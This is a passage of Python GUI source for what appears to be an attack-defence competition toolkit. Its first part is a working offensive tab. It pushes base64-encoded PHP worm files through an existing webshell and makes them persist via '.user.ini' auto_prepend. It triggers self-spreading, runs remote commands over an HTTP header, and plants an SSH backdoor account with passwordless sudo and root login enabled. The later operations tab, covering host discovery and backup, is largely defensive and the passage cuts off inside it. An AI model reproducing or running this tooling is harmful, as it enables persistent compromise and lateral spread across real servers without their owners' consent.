        f1 = tb.LabelFrame(f, text='目标配置', padding=6)
        f1.pack(fill=tk.X)
        g1 = tb.Frame(f1); g1.pack(fill=tk.X, pady=2)
        tb.Label(g1, text='IP/网段:').pack(side=tk.LEFT)
        self.e_ip = tb.Entry(g1); self.e_ip.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        self.e_ip.insert(0, self.cfg['ip'])
        tb.Label(g1, text='端口:').pack(side=tk.LEFT, padx=(4,0))
        self.e_port = tb.Entry(g1, width=5); self.e_port.insert(0, self.cfg['port'])
        self.e_port.pack(side=tk.LEFT, padx=2)
        self.v_https = tk.BooleanVar(value=self.cfg['https'])
        tb.Checkbutton(g1, text='HTTPS', variable=self.v_https).pack(side=tk.LEFT, padx=4)
        g2 = tb.Frame(f1); g2.pack(fill=tk.X, pady=2)
        tb.Label(g2, text='Webshell路径:').pack(side=tk.LEFT)
        self.e_surl = tb.Entry(g2, width=16)
        self.e_surl.insert(0, self.cfg['shell_url']); self.e_surl.pack(side=tk.LEFT, padx=2)
        tb.Label(g2, text='密码:').pack(side=tk.LEFT, padx=(6,0))
        self.e_spass = tb.Entry(g2, width=16, show='*')
        self.e_spass.insert(0, self.cfg['shell_pass']); self.e_spass.pack(side=tk.LEFT, padx=2)
        tb.Label(g2, text='木马密码:').pack(side=tk.LEFT, padx=(6,0))
        self.e_cpass = tb.Entry(g2, width=16, show='*')
        self.e_cpass.insert(0, self.cfg['password']); self.e_cpass.pack(side=tk.LEFT, padx=2)
        tb.Label(g2, text='超时:').pack(side=tk.LEFT, padx=(6,0))
        self.e_to = tb.Entry(g2, width=3); self.e_to.insert(0, '10')
        self.e_to.pack(side=tk.LEFT, padx=2)
        f2 = tb.LabelFrame(f, text='操作', padding=6)
        f2.pack(fill=tk.X, pady=4)
        g3 = tb.Frame(f2); g3.pack(fill=tk.X, pady=2)
        self.btn_implant = tb.Button(g3, text='\U0001f525 一键植入蠕虫不死马', command=self.do_implant, style='Warn.TButton')
        self.btn_implant.pack(side=tk.LEFT, padx=2)
        self.btn_dep = tb.Button(g3, text='\u25b6 部署', command=self.do_deploy)
        self.btn_dep.pack(side=tk.LEFT, padx=2)
        self.btn_spread = tb.Button(g3, text='\U0001f300 扩散', command=self.do_spread)
        self.btn_spread.pack(side=tk.LEFT, padx=2)
        self.btn_check = tb.Button(g3, text='\U0001f50d 检查扩散', command=self.do_check)
        self.btn_check.pack(side=tk.LEFT, padx=2)
        self.btn_kill = tb.Button(g3, text='\u274c 清除', command=self.do_kill)
        self.btn_kill.pack(side=tk.LEFT, padx=2)
        tb.Label(g3, text='命令:').pack(side=tk.LEFT, padx=(10,0))
        self.e_cmd = tb.Entry(g3); self.e_cmd.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        self.btn_exec = tb.Button(g3, text='执行', command=self.do_exec)
        self.btn_exec.pack(side=tk.LEFT, padx=2)
        # ── 木马类型选择 ──
        f_type = tb.LabelFrame(f, text='木马类型', padding=4)
        f_type.pack(fill=tk.X, pady=2)
        g_type = tb.Frame(f_type); g_type.pack(fill=tk.X)
        self.worm_type = tk.StringVar(value='creep')
        for val, lbl, desc in [
            ('creep', '\U0001f577 蠕虫马(自复制)', '横向扩散+自删除'),
            ('immortal', '\u2620\ufe0f 不死马(常驻)', '防删除+进程守护'),
            ('md5', '\U0001f511 MD5马(免杀)', '密码MD5验证'),
            ('memory', '\U0001f9e0 内存马(无文件)', '仅内存执行'),
        ]:
            tb.Radiobutton(g_type, text=lbl, variable=self.worm_type, value=val).pack(side=tk.LEFT, padx=6)
        tb.Label(g_type, text=f'({desc})', foreground='#8b949e', font=('微软雅黑', 8)).pack(side=tk.LEFT, padx=2)
        # Generate payload variant
        tb.Label(g_type, text='自定义KEY(可选):').pack(side=tk.LEFT, padx=(12,0))
        self.worm_key = tb.Entry(g_type, width=14); self.worm_key.insert(0, 'ylphantom')
        self.worm_key.pack(side=tk.LEFT, padx=2)

        # ── 底部子标签 ──
        bot_nb = tb.Notebook(f)
        bot_nb.pack(fill=tk.BOTH, expand=True, pady=(4,0))
        # 子页1: 执行日志
        bot_log = tb.Frame(bot_nb); bot_nb.add(bot_log, text='  \U0001f4dd 执行日志  ')
        self.log_w = LogWidget(bot_log)
        # 子页2: SSH后门
        bot_ssh = tb.Frame(bot_nb); bot_nb.add(bot_ssh, text='  \U0001f4bb SSH后门  ')
        ssh_f = tb.Frame(bot_ssh); ssh_f.pack(fill=tk.X, padx=4, pady=4)
        r1 = tb.Frame(ssh_f); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='SSH端口:').pack(side=tk.LEFT)
        self.c_ssh_port = tb.Entry(r1, width=4); self.c_ssh_port.insert(0, '22'); self.c_ssh_port.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='用户名:').pack(side=tk.LEFT, padx=(6,0))
        self.c_ssh_user = tb.Entry(r1, width=10); self.c_ssh_user.insert(0, 'root'); self.c_ssh_user.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='密码:').pack(side=tk.LEFT, padx=(6,0))
        self.c_ssh_pass = tb.Entry(r1, width=14, show='*'); self.c_ssh_pass.insert(0, 'y|lladmin121.@ss'); self.c_ssh_pass.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='后门账号:').pack(side=tk.LEFT, padx=(6,0))
        self.c_ssh_backuser = tb.Entry(r1, width=8); self.c_ssh_backuser.insert(0, 'backdoor'); self.c_ssh_backuser.pack(side=tk.LEFT, padx=2)
        r2 = tb.Frame(ssh_f); r2.pack(fill=tk.X, pady=2)
        self.btn_ssh_back = tb.Button(r2, text='\U0001f525 植入SSH后门', command=self.do_ssh_backdoor, bootstyle='danger')
        self.btn_ssh_back.pack(side=tk.LEFT, padx=2)
        self.btn_ssh_check = tb.Button(r2, text='\U0001f50d 检查SSH后门', command=self.do_ssh_back_check, width=14)
        self.btn_ssh_check.pack(side=tk.LEFT, padx=2)
        self.ssh_back_log = scrolledtext.ScrolledText(bot_ssh, font=('Consolas', 9), bg='#1e1e1e',
            fg='#d4d4d4', height=5, state=tk.DISABLED)
        self.ssh_back_log.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        for t, c in [('ok','#3fb950'),('fail','#f85149'),('info','#d4d4d4')]:
            self.ssh_back_log.tag_config(t, foreground=c)
        # 子页3: 心跳检测
        bot_hb = tb.Frame(bot_nb); bot_nb.add(bot_hb, text='  \u2764\ufe0f 心跳检测  ')
        hb_f = tb.Frame(bot_hb); hb_f.pack(fill=tk.X, padx=4, pady=4)
        self.c_hb_running = False
        self.btn_c_hb = tb.Button(hb_f, text='\u25b6 开始心跳', command=self.toggle_creep_hb, width=14)
        self.btn_c_hb.pack(side=tk.LEFT, padx=2)
        tb.Label(hb_f, text='间隔:').pack(side=tk.LEFT, padx=(8,0))
        self.c_hb_int = tb.Entry(hb_f, width=4); self.c_hb_int.insert(0, '30'); self.c_hb_int.pack(side=tk.LEFT, padx=2)
        tb.Label(hb_f, text='秒').pack(side=tk.LEFT)
        self.c_hb_lbl = tb.Label(hb_f, text='\u23f8 未启动', foreground='#8b949e')
        self.c_hb_lbl.pack(side=tk.LEFT, padx=12)
        self.c_hb_text = scrolledtext.ScrolledText(bot_hb, font=('Consolas', 9), bg='#1e1e1e',
            fg='#d4d4d4', height=5, state=tk.DISABLED)
        self.c_hb_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        for t, c in [('alive','#3fb950'),('dead','#f85149'),('info','#d4d4d4')]:
            self.c_hb_text.tag_config(t, foreground=c)

    def cfg_vals(self):
        return {
            'ips': self.e_ip.get().strip(),
            'port': int(self.e_port.get() or 80),
            'https': self.v_https.get(),
            'shell_url': self.e_surl.get().strip() or '/shell.php',
            'shell_pass': self.e_spass.get().strip() or 'y|lladmin121.@ss',
            'password': self.e_cpass.get().strip() or 'y|lladmin121.@ss',
            'timeout': int(self.e_to.get() or 10),
        }

    def save_cfg(self):
        c = self.cfg_vals()
        try:
            atomic_write(self.cfg_file, json.dumps({'ip':c['ips'],'port':c['port'],'https':c['https'],
                'shell_url':c['shell_url'],'shell_pass':c['shell_pass'],'password':c['password']}, indent=2))
        except Exception: pass

    def log_self(self, msg, tag='info'):
        self.log_w.log(msg, tag)

    def set_btns(self, enabled):
        st = tk.NORMAL if enabled else tk.DISABLED
        for b in (self.btn_implant, self.btn_dep, self.btn_spread, self.btn_check, self.btn_kill, self.btn_exec):
            b.config(state=st)

    def get_targets(self):
        raw = self.e_ip.get().strip()
        if not raw: messagebox.showwarning('警告', '请先输入目标IP'); return []
        return parse_targets(raw)

    def do_implant(self):
        ips = self.get_targets()
        if not ips: return
        self.set_btns(False); self.save_cfg()
        self.log_self('='*50, 'warn')
        self.log_self('>>> \U0001f525 一键植入蠕虫不死马', 'warn')
        self.log_self('='*50, 'warn')
        c = self.cfg_vals()
        def run():
            ok=fail=0
            with ThreadPoolExecutor(max_workers=min(10,len(ips))) as ex:
                fs = {ex.submit(self.implant_one, ip, c): ip for ip in ips}
                for f in as_completed(fs):
                    ip, succ, msg = f.result()
                    self.log_self(f'  {"[OK]" if succ else "[FAIL]"} {ip}: {msg}', 'ok' if succ else 'fail')
                    ok+=succ; fail+=not succ
            self.log_self(f'一键植入完成: {ok}成功 {fail}失败', 'ok' if ok>=fail else 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        async_run(run)

    def implant_one(self, ip, c):
        base = make_base(ip, c['port'], c['https'])
        try:
            php_path = os.path.join(CREEP_DIR, '.creep.php')
            dat_path = os.path.join(CREEP_DIR, '.creep.dat')
            if not os.path.exists(php_path): return ip, False, f'文件不存在: {php_path}'
            if not os.path.exists(dat_path): return ip, False, f'文件不存在: {dat_path}'
            s = _session()
            with open(php_path, 'rb') as f: php = f.read()
            with open(dat_path, 'rb') as f: dat = f.read()
            b64_php = base64.b64encode(php).decode()
            b64_dat = base64.b64encode(dat).decode()
            for cmd, nm in [(f"file_put_contents('/.creep.php', base64_decode('{b64_php}'))",'PHP'),
                            (f"file_put_contents('/.creep.dat', base64_decode('{b64_dat}'))",'DAT'),
                            (f"file_put_contents('/.user.ini', 'auto_prepend_file=.creep.php\\n')",'INI')]:
                s.post(f'{base}{c["shell_url"]}', data={c['shell_pass']: cmd}, timeout=c['timeout'])
                time.sleep(0.05)
            time.sleep(0.3)
            r1 = requests.get(f'{base}/.creep.php',
                headers={'X-Creep': c['password'], 'X-Spread': '1'}, timeout=c['timeout'])
            r2 = requests.get(f'{base}/.creep.php',
                headers={'X-Creep': c['password'], 'X-Worm': '1'}, timeout=c['timeout'])
            res1 = r1.text.strip()[:20] if r1.status_code==200 else f'HTTP{r1.status_code}'
            res2 = r2.text.strip()[:20] if r2.status_code==200 else f'HTTP{r2.status_code}'
            return ip, True, f'部署OK | 扩散:{res1} | 蠕虫:{res2}'
        except Exception as e: return ip, False, str(e)[:60]

    def deploy_one(self, ip, c):
        base = make_base(ip, c['port'], c['https'])
        try:
            php_path = os.path.join(CREEP_DIR, '.creep.php')
            dat_path = os.path.join(CREEP_DIR, '.creep.dat')
            if not os.path.exists(php_path): return ip, False, f'文件不存在: {php_path}'
            if not os.path.exists(dat_path): return ip, False, f'文件不存在: {dat_path}'
            s = _session()
            with open(php_path, 'rb') as f: php = f.read()
            with open(dat_path, 'rb') as f: dat = f.read()
            b64_php = base64.b64encode(php).decode()
            b64_dat = base64.b64encode(dat).decode()
            for cmd, nm in [(f"file_put_contents('/.creep.php', base64_decode('{b64_php}'))",'PHP'),
                            (f"file_put_contents('/.creep.dat', base64_decode('{b64_dat}'))",'DAT'),
                            (f"file_put_contents('/.user.ini', 'auto_prepend_file=.creep.php\\n')",'INI')]:
                s.post(f'{base}{c["shell_url"]}', data={c['shell_pass']: cmd}, timeout=c['timeout'])
                time.sleep(0.05)
            time.sleep(0.3)
            r = s.get(f'{base}/.creep.php', timeout=c['timeout'])
            return ip, r.status_code in (200,403), '部署成功' if r.status_code in (200,403) else f'状态{r.status_code}'
        except Exception as e: return ip, False, str(e)[:50]

    def do_deploy(self):
        ips = self.get_targets()
        if not ips: return
        self.set_btns(False); self.save_cfg()
        self.log_self(f'>>> 部署 Creep 到 {len(ips)} 台', 'info')
        c = self.cfg_vals()
        def run():
            ok=fail=0
            with ThreadPoolExecutor(max_workers=min(10,len(ips))) as ex:
                fs = {ex.submit(self.deploy_one, ip, c): ip for ip in ips}
                for f in as_completed(fs):
                    ip, succ, msg = f.result()
                    self.log_self(f'  {"[OK]" if succ else "[FAIL]"} {ip}: {msg}', 'ok' if succ else 'fail')
                    ok+=succ; fail+=not succ
            self.log_self(f'结果: {ok}成功 {fail}失败', 'ok' if ok>=fail else 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        async_run(run)

    def spread_one(self, ip, c):
        base = make_base(ip, c['port'], c['https'])
        try:
            r = requests.get(f'{base}/.creep.php',
                headers={'X-Creep': c['password'], 'X-Spread': '1'}, timeout=c['timeout'])
            return ip, 'OK' in r.text[:10], r.text.strip()[:30]
        except Exception as e: return ip, False, str(e)[:40]

    def do_spread(self):
        ips = self.get_targets()
        if not ips: return
        self.set_btns(False); self.save_cfg()
        self.log_self(f'>>> 触发扩散 到 {len(ips)} 台', 'info')
        c = self.cfg_vals()
        def run():
            ok=fail=0
            with ThreadPoolExecutor(max_workers=min(10,len(ips))) as ex:
                fs = {ex.submit(self.spread_one, ip, c): ip for ip in ips}
                for f in as_completed(fs):
                    ip, succ, msg = f.result()
                    self.log_self(f'  {"[OK]" if succ else "[FAIL]"} {ip}: {msg}', 'ok' if succ else 'fail')
                    ok+=succ; fail+=not succ
            self.log_self(f'扩散完成: {ok}成功 {fail}失败', 'ok' if ok>=fail else 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        async_run(run)

    def do_check(self):
        ips = self.get_targets()
        if not ips: return
        self.log_self(f'>>> 检查扩散范围 ({len(ips)}台)', 'info')
        c = self.cfg_vals()
        def run():
            for ip in ips:
                try:
                    base = make_base(ip, c['port'], c['https'])
                    r = requests.get(f'{base}/.creep.php',
                        headers={'X-Creep': c['password'], 'X-Cmd': 'find / -name ".creep.php" -type f 2>/dev/null'},
                        timeout=c['timeout'])
                    cnt = len(r.text.strip().split('\n')) if r.text.strip() and r.text.strip() != '(empty)' else 0
                    samples = r.text.strip()[:120] if cnt else '无'
                    self.log_self(f'  [{ip}] 感染目录: {cnt}', 'ok' if cnt else 'fail')
                    if cnt: self.log_self(f'    路径: {samples}', 'info')
                except Exception as e: self.log_self(f'  [FAIL] {ip}: {e}', 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        self.set_btns(False)
        async_run(run)

    def do_exec(self):
        cmd = self.e_cmd.get().strip()
        if not cmd: messagebox.showwarning('提示', '请输入命令'); return
        ips = self.get_targets()
        if not ips: return
        self.log_self(f'>>> 执行: {cmd}', 'info')
        c = self.cfg_vals()
        def run():
            for ip in ips:
                try:
                    base = make_base(ip, c['port'], c['https'])
                    r = requests.get(f'{base}/.creep.php',
                        headers={'X-Creep': c['password'], 'X-Cmd': cmd}, timeout=c['timeout'])
                    self.log_self(f'[{ip}] {r.text.strip()[:300]}', 'out')
                except Exception as e: self.log_self(f'[FAIL] {ip}: {e}', 'fail')
        async_run(run)

    def do_kill(self):
        ips = self.get_targets()
        if not ips: return
        if not messagebox.askyesno('确认', f'清除 {len(ips)} 台靶机上的 Creep webshell？'): return
        self.log_self(f'>>> 清除 Creep ({len(ips)}台)', 'warn')
        c = self.cfg_vals()
        def run():
            for ip in ips:
                try:
                    base = make_base(ip, c['port'], c['https'])
                    s = _session()
                    s.post(f'{base}{c["shell_url"]}', data={c['shell_pass']:
                        '@unlink("/.creep.php");@unlink("/.creep.dat");@unlink("/.user.ini");'
                        '$r=new RecursiveDirectoryIterator("/");foreach(new RecursiveIteratorIterator($r)as$d){'
                        'if($d->isFile()&&strpos($d->getFilename(),"creep")!==false)@unlink($d->getRealPath());'
                        '}echo "OK";'}, timeout=c['timeout'])
                    self.log_self(f'  [OK] {ip}', 'ok')
                except Exception as e: self.log_self(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    # ── SSH后门 ──
    def ssh_back_log_msg(self, msg, tag='info'):
        self.ssh_back_log.config(state=tk.NORMAL)
        self.ssh_back_log.insert(tk.END, f'[{datetime.now().strftime("%H:%M:%S")}] {msg}\n', tag)
        self.ssh_back_log.see(tk.END)
        self.ssh_back_log.config(state=tk.DISABLED)

    def do_ssh_backdoor(self):
        ips = self.get_targets()
        if not ips: return
        c = self.cfg_vals()
        backuser = self.c_ssh_backuser.get().strip() or 'backdoor'
        backpass = c['password']
        self.ssh_back_log_msg(f'>>> 植入SSH后门 到 {len(ips)} 台', 'info')
        def run():
            for ip in ips:
                try:
                    base = make_base(ip, c['port'], c['https'])
                    s = _session()
                    cmds = [
                        f'useradd -m -s /bin/bash {backuser} 2>/dev/null; echo "{backuser}:{backpass}" | chpasswd 2>/dev/null',
                        f'usermod -aG sudo {backuser} 2>/dev/null || usermod -aG wheel {backuser} 2>/dev/null',
                        f'echo "{backuser} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null',
                        f'mkdir -p ~{backuser}/.ssh && chmod 700 ~{backuser}/.ssh && touch ~{backuser}/.ssh/authorized_keys',
                        'sed -i "s/PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config',
                        'service sshd restart 2>/dev/null || systemctl restart sshd 2>/dev/null',
                    ]
                    for cmd in cmds:
                        s.post(f'{base}{c["shell_url"]}', data={c['shell_pass']: cmd}, timeout=c['timeout'])
                        time.sleep(0.1)
                    self.ssh_back_log_msg(f'  [OK] {ip} 后门账号: {backuser}', 'ok')
                except Exception as e: self.ssh_back_log_msg(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    def do_ssh_back_check(self):
        ips = self.get_targets()
        if not ips: return
        c = self.cfg_vals()
        backuser = self.c_ssh_backuser.get().strip() or 'backdoor'
        self.ssh_back_log_msg(f'>>> 检查SSH后门 账号: {backuser}', 'info')
        def run():
            for ip in ips:
                try:
                    base = make_base(ip, c['port'], c['https'])
                    r = _session().post(f'{base}{c["shell_url"]}', data={c['shell_pass']: f'id {backuser} 2>/dev/null || echo "NOT_FOUND"'}, timeout=c['timeout'])
                    if 'NOT_FOUND' in r.text: self.ssh_back_log_msg(f'  [!] {ip}: 后门账号不存在', 'fail')
                    else: self.ssh_back_log_msg(f'  [OK] {ip}: {r.text.strip()[:80]}', 'ok')
                except Exception as e: self.ssh_back_log_msg(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    # ── 心跳检测 ──
    def c_hb_msg(self, msg, tag='info'):
        self.c_hb_text.config(state=tk.NORMAL)
        self.c_hb_text.insert(tk.END, f'[{datetime.now().strftime("%H:%M:%S")}] {msg}\n', tag)
        self.c_hb_text.see(tk.END)
        self.c_hb_text.config(state=tk.DISABLED)

    def toggle_creep_hb(self):
        if self.c_hb_running:
            self.c_hb_running = False
            self.btn_c_hb.config(text='\u25b6 开始心跳')
            self.c_hb_lbl.config(text='\u23f8 已停止', foreground='#8b949e')
            return
        ips = self.get_targets()
        if not ips: return
        self.c_hb_running = True
        self.btn_c_hb.config(text='\u23f9 停止心跳')
        interval = max(5, int(self.c_hb_int.get() or 30))
        self.c_hb_lbl.config(text=f'\u23f3 检测中', foreground='#3fb950')
        c = self.cfg_vals()
        def run():
            while self.c_hb_running:
                alive = dead = 0
                with ThreadPoolExecutor(max_workers=min(20, len(ips))) as ex:
                    def check(ip):
                        try:
                            base = make_base(ip, c['port'], c['https'])
                            r = requests.get(f'{base}/.creep.php', timeout=c['timeout'])
                            return ip, r.status_code in (200, 403)
                        except Exception: return ip, False
                    fs = {ex.submit(check, ip): ip for ip in ips}
                    for f in as_completed(fs):
                        ip, ok = f.result()
                        if ok: alive += 1
                        else: dead += 1
                self.c_hb_msg(f'存活: {alive}/{len(ips)} 死亡: {dead}', 'alive' if alive>dead else 'dead')
                self.root.after(0, lambda a=alive, d=dead: self.c_hb_lbl.config(
                    text=f'\U0001f7e2 {a}  \U0001f534 {d}', foreground='#3fb950' if a>d else '#f85149'))
                for _ in range(interval):
                    if not self.c_hb_running: break
                    time.sleep(1)
            self.c_hb_msg('心跳监控已停止', 'info')
        threading.Thread(target=run, daemon=True).start()


# ============================================================
#  Tab 5: 综合运维 (新增)
# ============================================================
class OpsTab:
    def __init__(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.root = None
        self.build_ui()

    def build_ui(self):
        nbf = tb.Notebook(self.parent)
        nbf.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        # 各子页面
        f1 = tb.Frame(nbf); nbf.add(f1, text='  \U0001f50d 存活探测  ')
        self.build_discover(f1)
        f2 = tb.Frame(nbf); nbf.add(f2, text='  \U0001f4e5 备份还原  ')
        self.build_backup(f2)
        f3 = tb.Frame(nbf); nbf.add(f3, text='  \U0001f4bb SSH管理  ')
        self.build_ssh(f3)
        f4 = tb.Frame(nbf); nbf.add(f4, text='  \U0001f9f0 进程端口  ')
        self.build_process(f4)
        f5 = tb.Frame(nbf); nbf.add(f5, text='  \U0001f50d 木马查杀  ')
        self.build_scanner(f5)
        f6 = tb.Frame(nbf); nbf.add(f6, text='  \U0001f4ca 数据库  ')
        self.build_database(f6)
        f7 = tb.Frame(nbf); nbf.add(f7, text='  \U0001f6e1 加固基线  ')
        self.build_harden(f7)
        f8 = tb.Frame(nbf); nbf.add(f8, text='  \U0001f527 自动修复  ')
        self.build_autofix(f8)
        f9 = tb.Frame(nbf); nbf.add(f9, text='  \U0001f6ab IP黑名单  ')
        self.build_ipban(f9)
        f10 = tb.Frame(nbf); nbf.add(f10, text='  \U0001f4c5 定时备份  ')
        self.build_sched_backup(f10)
        f11 = tb.Frame(nbf); nbf.add(f11, text='  \U0001f50d phpinfo  ')
        self.build_phpinfo(f11)

    # ── 公共: 共享目标输入 ──
    def _target_frame(self, parent):
        f = tb.LabelFrame(parent, text='目标配置', padding=4)
        f.pack(fill=tk.X)
        r = tb.Frame(f); r.pack(fill=tk.X)
        tb.Label(r, text='IP/网段:').pack(side=tk.LEFT)
        e = tb.Entry(r); e.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Label(r, text='端口:').pack(side=tk.LEFT)
        ep = tb.Entry(r, width=5); ep.insert(0, '80'); ep.pack(side=tk.LEFT, padx=2)
        vh = tk.BooleanVar()
        tb.Checkbutton(r, text='HTTPS', variable=vh).pack(side=tk.LEFT, padx=2)
        tb.Label(r, text='超时:').pack(side=tk.LEFT)
        et = tb.Entry(r, width=3); et.insert(0, '5'); et.pack(side=tk.LEFT, padx=2)
        tb.Label(r, text='秒').pack(side=tk.LEFT)
        return e, ep, vh, et

    def _log_frame(self, parent):
        f = tb.LabelFrame(parent, text='日志', padding=4)
        f.pack(fill=tk.BOTH, expand=True, pady=4)
        lw = LogWidget(f)
        return lw

    def _btn_frame(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.X, pady=2)
        return f

    # ── 存活探测 ──
    def build_discover(self, parent):
        e_ip, ep, vh, et = self._target_frame(parent)
        bf = self._btn_frame(parent)
        tb.Label(bf, text='扫描方式:').pack(side=tk.LEFT)
        scan_mode = tk.StringVar(value='ping')
        tb.Radiobutton(bf, text='Ping扫描', variable=scan_mode, value='ping').pack(side=tk.LEFT, padx=2)
        tb.Radiobutton(bf, text='端口扫描', variable=scan_mode, value='port').pack(side=tk.LEFT, padx=2)
        tb.Radiobutton(bf, text='Naabu快扫', variable=scan_mode, value='naabu').pack(side=tk.LEFT, padx=2)
        tb.Label(bf, text='端口:').pack(side=tk.LEFT, padx=(8,0))
        e_port = tb.Entry(bf, width=8); e_port.insert(0, '80,443,8080,22'); e_port.pack(side=tk.LEFT, padx=2)
        btn = tb.Button(bf, text='\u25b6 开始探测', command=lambda: self.do_discover(e_ip, ep, vh, et, scan_mode, e_port))
        btn.pack(side=tk.LEFT, padx=6)
        lw = self._log_frame(parent)
        self._disc_log = lw

    def do_discover(self, e_ip, ep, vh, et, scan_mode, e_port):
        ips = parse_targets(e_ip.get().strip())
        if not ips: messagebox.showwarning('警告', '请先输入IP'); return
        mode = scan_mode.get()
        port = int(ep.get() or 80); timeout = int(et.get() or 5)
        lw = self._disc_log; lw.clear()
        lw.log(f'>>> 存活探测 ({mode}) - {len(ips)} 个目标', 'info')
        TOOLS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'aigongju')
        def run():
            for ip in ips:
                try:
                    if mode == 'ping':
                        r = subprocess.run(['ping', '-n', '1', '-w', str(int(timeout*1000)), ip], capture_output=True, timeout=timeout+5)
                        alive = r.returncode == 0
                    elif mode == 'naabu':
                        naabu_exe = os.path.join(TOOLS_DIR, 'naabu_2.3.3_windows_amd64', 'naabu.exe')
                        if os.path.exists(naabu_exe):
                            port_str = e_port.get().strip() or '80'
                            try:
                                r = subprocess.run([naabu_exe, '-host', ip, '-p', port_str, '-silent'], capture_output=True, timeout=timeout+10)
                                alive = ip.encode() in r.stdout  # naabu outputs ip:port per line
                            except Exception: alive = False
                        else:
                            lw.log(f'  [SKIP] {ip}: naabu未找到', 'warn')
                            alive = False
                    else:
                        ports = [int(x.strip()) for x in e_port.get().strip().split(',') if x.strip()]
                        alive = False
                        for p in ports:
                            try:
                                s = socket.socket(); s.settimeout(timeout)
                                r = s.connect_ex((ip, p)); s.close()
                                if r == 0:
                                    alive = True; break
                            except Exception: pass
                    tag = 'ok' if alive else 'fail'
                    lw.log(f'  {"[ALIVE]" if alive else "[DEAD]"} {ip}', tag)
                except Exception as ex: lw.log(f'  [ERR] {ip}: {ex}', 'fail')
        async_run(run)

    # ── 备份还原 ──
    def build_backup(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='本地Web目录备份/还原', padding=4)
        f1.pack(fill=tk.X)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='Web根目录:').pack(side=tk.LEFT)
        self.bak_webdir = tb.Entry(r1); self.bak_webdir.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        self.bak_webdir.insert(0, '/var/www/html')
        tb.Label(r1, text='备份目录:').pack(side=tk.LEFT)
        self.bak_dir = tb.Entry(r1, width=20); self.bak_dir.pack(side=tk.LEFT, padx=4)
        self.bak_dir.insert(0, os.path.join(BASE, '攻击模块', 'backup'))
        r2 = tb.Frame(f1); r2.pack(fill=tk.X, pady=2)
        self.btn_bak = tb.Button(r2, text='\U0001f4e5 备份', command=self.do_backup)
        self.btn_bak.pack(side=tk.LEFT, padx=2)
        self.btn_restore = tb.Button(r2, text='\U0001f504 还原', command=self.do_restore)
        self.btn_restore.pack(side=tk.LEFT, padx=2)
        self.bak_lw = self._log_frame(f)

    def do_backup(self):
        wd = self.bak_webdir.get().strip()
        bd = self.bak_dir.get().strip()
        if not os.path.isdir(wd): messagebox.showerror('错误', f'目录不存在: {wd}'); return
        os.makedirs(bd, exist_ok=True)
        lw = self.bak_lw; lw.clear()
        lw.log(f'>>> 备份 {wd} -> {bd}', 'info')
        def run():
            import tarfile
            bak_name = f'web_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.tar.gz'
            bak_path = os.path.join(bd, bak_name)
            try:
                with tarfile.open(bak_path, 'w:gz') as tar:
                    tar.add(wd, arcname=os.path.basename(wd))
                sz = os.path.getsize(bak_path)
                lw.log(f'[OK] 备份完成: {bak_name} ({sz/1024:.1f}KB)', 'ok')
            except Exception as e: lw.log(f'[FAIL] 备份失败: {e}', 'fail')
        async_run(run)

    def do_restore(self):
        bd = self.bak_dir.get().strip()
        if not os.path.isdir(bd): messagebox.showerror('错误', f'备份目录不存在: {bd}'); return
        baks = [f for f in os.listdir(bd) if f.endswith('.tar.gz')]
        if not baks: messagebox.showwarning('提示', '没有找到备份文件'); return
        import tarfile
        lw = self.bak_lw; lw.clear()
        last = sorted(baks)[-1]; bak_path = os.path.join(bd, last)
        wd = self.bak_webdir.get().strip()
        lw.log(f'>>> 还原: {last} -> {wd}', 'info')
        def run():
            try:
                with tarfile.open(bak_path, 'r:gz') as tar:
                    for member in tar.getmembers():
                        if member.issym() or member.islnk(): continue
                        name = os.path.normpath('/' + member.name).lstrip('/')
                        if '..' in name or name.startswith('/'): continue
                        target = os.path.join(wd, os.path.relpath(name, os.path.basename(wd) if os.path.basename(wd) in name else ''))
                        if not target.startswith(os.path.abspath(wd)): continue
                        if member.isdir(): os.makedirs(target, exist_ok=True)
                        else:
                            src = tar.extractfile(member)
                            if src:
                                os.makedirs(os.path.dirname(target), exist_ok=True)
                                with open(target, 'wb') as dst: shutil.copyfileobj(src, dst)
                lw.log(f'[OK] 还原完成', 'ok')
            except Exception as e: lw.log(f'[FAIL] 还原失败: {e}', 'fail')
        async_run(run)

    # ── SSH管理 ──
    def build_ssh(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='SSH配置', padding=4)
        f1.pack(fill=tk.X)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='IP:').pack(side=tk.LEFT)
        self.ssh_ip = tb.Entry(r1, width=16); self.ssh_ip.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='端口:').pack(side=tk.LEFT)
        self.ssh_port = tb.Entry(r1, width=4); self.ssh_port.insert(0, '22'); self.ssh_port.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='用户名:').pack(side=tk.LEFT)
